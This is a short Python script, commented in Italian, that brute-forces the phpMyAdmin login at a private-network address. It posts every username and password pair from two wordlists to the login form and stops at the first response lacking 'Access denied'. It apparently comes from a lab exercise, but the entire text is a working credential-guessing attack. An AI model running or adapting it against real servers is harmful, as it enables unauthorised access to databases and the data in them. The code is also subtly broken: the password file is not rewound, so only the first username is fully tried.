#programma di Brute Force accesso phpMyAdmin
import requests

#liste username e password da utilizzare
username_file_path = 'usernames.lst'
password_file_path = 'passwords.lst'

#comandi per utilizzare le liste di username e password
with open(username_file_path,'r') as usernames, open(password_file_path,'r') as passwords:

    #ciclo for per selezionare username e rispettive password
    for username in usernames:
        username=username.rstrip()

        for password in passwords:
            password=password.rstrip()
            url="http://192.168.32.101/phpMyAdmin/"
            #dizionario dati inviati nella richiesta HTTP
            payload = {'pma_username':username,'pma_password':password,'input_go':'Go'}
            
            #importazione delle varie combinazioni username e password
            try:
                response = requests.post(url,data=payload)
                print(f"Username:{username}, Password:{password}", end=" *** ")
            #costrutto if per trovare username e password corretti per il login
                if response.status_code == 200:
                    if 'Access denied' in response.text:#accesso negato continua la ricerca
                        print("")
                    else:
                        print("Success!")
                        exit()
                else:
                    print('Errore:', response.status_code)
            except requests.exceptions.RequestException as e:
                print("Errore nella richiesta:",e)
